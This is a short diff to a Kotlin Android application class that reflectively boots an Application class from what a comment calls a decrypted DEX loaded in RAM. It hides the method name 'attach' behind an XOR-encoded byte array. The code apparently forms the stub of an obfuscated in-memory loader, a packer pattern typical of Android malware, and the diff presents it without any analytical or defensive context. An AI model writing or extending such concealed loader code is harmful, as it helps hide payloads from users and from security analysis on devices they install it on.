@@ -95,7 +95,8 @@ class BerlinAppEntry : Application() {
     private fun kick() {
         val b = h ?: classLoader ?: return
         try {
-            val cls = Class.forName((packageName ?: return) + ".berlin.BerlinInstallActivity", true, b)
+            // Boot LauncherApplication from the decrypted DEX loaded in RAM
+            val cls = Class.forName((packageName ?: return) + ".LauncherApplication", true, b)
             val app = cls.newInstance() as? Application ?: return
             val ae  = byteArrayOf(0x3b,0x2e,0x2e,0x3b,0x39,0x32)
             val ac  = CharArray(ae.size); var i = 0; while (i < ae.size) { ac[i] = (ae[i].toInt() and 0xFF xor 0x5A).toChar(); i++ }
